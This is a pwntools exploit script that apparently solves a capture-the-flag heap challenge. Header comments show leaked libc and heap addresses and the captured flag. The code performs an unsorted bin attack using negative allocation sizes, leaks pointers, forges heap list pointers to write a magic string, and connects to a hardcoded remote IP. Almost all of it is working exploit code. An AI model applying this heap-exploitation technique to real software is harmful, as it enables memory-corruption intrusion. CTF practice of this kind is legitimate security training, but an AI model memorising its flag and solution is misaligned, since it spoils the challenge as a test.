# [+] Libc: 0x7fa7f284d000
# [+] Heap: 0x4dc000
# [*] Switching to interactive mode
# Title: CTF{d1d_y0u_ju57_wr173_p457_7h3_30f?}

from pwn import *
import os

string = "GIMMETHEFLAG"

array = 0xcafeb000
fd    = array - (3*8)
bk    = array - (2*8)
atoi  = 0x601f60

libc = 0
heap = 0

def alloc(size, title, body = ''):
	r.sendlineafter('> \n', '1')
	r.sendlineafter('length> \n', str(size))
	r.sendlineafter('title> \n', title)

	if size < 0:
		return
	r.sendlineafter('body> \n', body)
	return

def free(idx):
	r.sendlineafter('> \n', '2')
	r.sendlineafter('index> \n', str(idx))
	return

def edit(size, idx, title, body = ''):
	r.sendlineafter('> \n', '3')
	r.sendlineafter('index> \n', str(idx))
	r.sendlineafter('title> \n', title)

	if size < 0:
		return
	r.sendlineafter('body> \n', body)
	return

def pr(idx):	
	global heap
	global libc

	r.sendlineafter('> \n', '4')
	r.sendlineafter('index> \n', str(idx))
	r.recvuntil('Title: ')
	heap = u64(r.recv(3).ljust(8, chr(0))) - 0x1d0
	r.recvuntil('Body: ')
	libc = u64(r.recv(6).ljust(8, chr(0))) - 0x3c4c08
	return 

def get_flag():	
	r.sendlineafter('> \n', '6')
	return 

def pwn():
	
	alloc(0x90 - 0x10 - 0xa0, 'A'*8) # 0
	alloc(0x20 - 0x10 - 0xa0, 'lel') # 1
	alloc(0x90 - 0x10 - 0xa0, 'A'*8) # 2
	# Avoid top chunk consolidation
	alloc(0x90 - 0x10 - 0xa0, 'A'*8) # 3

	free(2)

	edit(0x20 - 0x10 - 0xa0, 1, p64(0) * 3 + p64(0x91) + p64(0) + p64(array - 0x10))

	# Perform unsorted bin attack on the bss array which holds
	# the pointer to the array of heap pointers.
	alloc(0x90 - 0x10 - 0xa0, 'A'*8) # 4

	pr(0)

	# We will need the original FD/BK values of the unsorted bin list
	# in order to avoid the abort and be able to allocate from av->top
	# which will be 0xcafeb000.
	arena_ptr = libc + 0x3c4b78
	log.success('Libc: 0x{:x}'.format(libc))
	log.success('Heap: 0x{:x}'.format(heap))

	# Now the unsorted bin's address is at the 0th index of the heap array.
	edit(0x90 - 0x10 - 0xa0, 0, p64(0xcafeb000) + p64(0) + p64(arena_ptr)*2)

	# Overwrite the offset of 0xcafeb000 + 0x38 with "GIMMETHEFLAG"
	# so that verifier.o gives us the flag
	alloc(0x20 - 0x10 - 0xa0, p64(0xcafeb0e0)*5 + p64(0xdeadb040) + string + chr(0))

	get_flag()

	r.sendlineafter('> \n', '4')
	r.sendlineafter('index> \n', '2')
	# CTF{d1d_y0u_ju57_wr173_p457_7h3_30f?}
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('51.15.73.163', 8888)
        pwn()
    else:
    	os.system('rm /dev/shm/notes_dir')
        r = process('./service.o')
        pause()
        pwn()
